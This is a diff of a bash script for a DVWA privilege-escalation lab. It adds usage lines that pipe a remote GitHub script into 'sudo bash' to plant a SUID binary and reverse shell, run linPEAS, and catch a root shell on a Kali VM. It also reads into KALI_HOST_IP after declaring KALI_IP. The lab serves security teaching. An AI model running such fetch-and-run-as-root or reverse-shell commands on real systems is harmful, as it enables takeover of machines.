@@ -8,10 +8,10 @@
 # --- For Ubuntu DVWA VM (The Target) ---
 #
 # Set up the SUID binary and reverse shell script:
-#   wget -qO- <script_url> | sudo bash -s suid_setup
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s suid_setup
 #
 # Download and run the linPEAS privilege escalation scanner:
-#   wget -qO- <script_url> | sudo bash -s peas_scan
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s peas_scan
 #
 # --- For Kali VM (The Attacker) ---
 #
@@ -19,7 +19,7 @@
 #   DVWA_PHPSESSID=<ID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_shell
 #
 # Display instructions on how to trigger the exploit and catch the root shell:
-#   wget -qO- <script_url> | sudo bash -s trigger_exploit
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s trigger_exploit
 #
 
 # --- Script Configuration ---
@@ -67,9 +67,8 @@ ubuntu_setup_suid_escalation() {
 
     # --- Step 1: Get Attacker IP for the Reverse Shell ---
     local KALI_IP
-    echo -ne "\e[96mEnter your Kali VM's IP address (for the reverse shell to connect to): \e[0m"
-    read -p "" KALI_IP
-    if [ -z "$KALI_IP" ]; then
+    echo -ne "${CYAN}Enter your Kali VM's IP address (e.g., 192.168.56.1 for the reverse shell to connect to, 15s timeout): ${RESET}"
+    if ! read -t 15 KALI_HOST_IP < /dev/tty || [ -z "$KALI_HOST_IP" ]; then
         print_error "Kali IP address cannot be empty. Aborting."
         exit 1
     fi
